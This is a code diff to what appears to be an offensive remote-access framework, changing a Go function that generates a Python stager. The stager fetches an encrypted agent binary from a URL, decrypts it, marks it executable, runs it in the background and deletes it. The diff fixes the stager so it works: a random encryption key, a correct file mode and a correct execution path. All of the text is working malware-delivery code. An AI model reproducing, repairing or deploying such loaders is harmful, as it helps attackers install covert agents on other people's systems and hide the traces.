@@ -10,7 +10,7 @@ import (
 
 func python_http_aes_download_exec(agent_bin_path, url string) (ret []byte) {
 	// encrypt payload (agent binary)
-	key := tun.GenAESKey("sdnvodsnvsdvsxfljsdbnfb")
+	key := tun.GenAESKey(util.RandStr(10))
 	fdata, err := os.ReadFile(agent_bin_path)
 	if err != nil {
 		CliPrintError("python stager failed to read agent binary: %v", err)
@@ -29,8 +29,8 @@ import struct,binascii,urllib2,os
 def xor_decrypt(key,ciphertext):return ''.join([chr(ord(B)^ord(key[A%%len(key)]))for(A,B)in enumerate(ciphertext)])
 def download_file(url):A=urllib2.urlopen(url);B=A.read();return B
 open(_A,'wb+').write(xor_decrypt('%s',download_file('%s')))
-os.chmod(_A,755)
-os.system('_A&')
+os.chmod(_A,0o755)
+os.system('./%%s&'%%_A)
 os.remove(_A)`, util.RandStr(22), key, url)
 
 	return []byte(py_template)
